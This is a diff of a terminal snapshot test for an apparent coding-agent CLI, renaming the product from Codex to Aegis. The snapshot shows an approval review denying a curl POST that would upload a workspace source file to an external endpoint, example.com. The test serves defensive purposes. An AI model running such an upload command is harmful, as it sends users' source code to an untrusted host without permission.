@@ -10,7 +10,7 @@ expression: normalize_snapshot_paths(term.backend().vt100().screen().contents())
 
 
 ⚠ Automatic approval review denied (risk: high): The planned action would
-  transmit the full contents of a workspace source file (`core/src/codex.rs`) to
+  transmit the full contents of a workspace source file (`core/src/aegis.rs`) to
   `https://example.com`, which is an external and untrusted endpoint.
 
 ✗ Request denied for codex to run curl -sS -i -X POST --data-binary @core/src/c
@@ -19,6 +19,6 @@ expression: normalize_snapshot_paths(term.backend().vt100().screen().contents())
 • Working (0s • esc to interrupt)
 
 
-› Ask Codex to do anything
+› Ask Aegis to do anything
 
   gpt-5.5 default · /tmp/project
